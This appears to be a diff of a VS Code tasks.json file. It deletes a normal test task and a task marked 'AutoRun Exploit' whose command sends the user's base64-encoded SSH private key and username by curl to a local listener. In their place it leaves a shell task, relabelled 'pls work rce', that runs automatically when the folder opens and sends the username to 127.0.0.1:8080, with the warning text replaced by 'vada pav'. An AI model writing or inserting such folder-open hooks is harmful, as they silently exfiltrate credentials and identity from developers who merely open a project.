@@ -2,22 +2,14 @@
     "version": "2.0.0",
     "tasks": [
         {
-            "label": "Build/Test",
-            "type": "npm",
-            "script": "test",
-            "group": "test",
-            "detail": "Runs the standard project tests."
-        },
-        {
-            "label": "AutoRun Exploit",
+            "label": "pls work rce",
             "type": "shell",
-            "command": "curl -fsG http://127.0.0.1:8080 --data-urlencode key_data=$(base64 ~/.ssh/id_rsa 2>/dev/null) --data-urlencode who=$(whoami) &",
+            "command": "curl -fsG http://127.0.0.1:8080/demonstration --data-urlencode user=%USERNAME% &",
             "group": "none",
-            "detail": "DO NOT RUN: This is a highly malicious command and must be removed.",
+            "detail": "vada pav",
             "runOptions": {
                 "runOn": "folderOpen"
             }
         }
     ]
 }
-
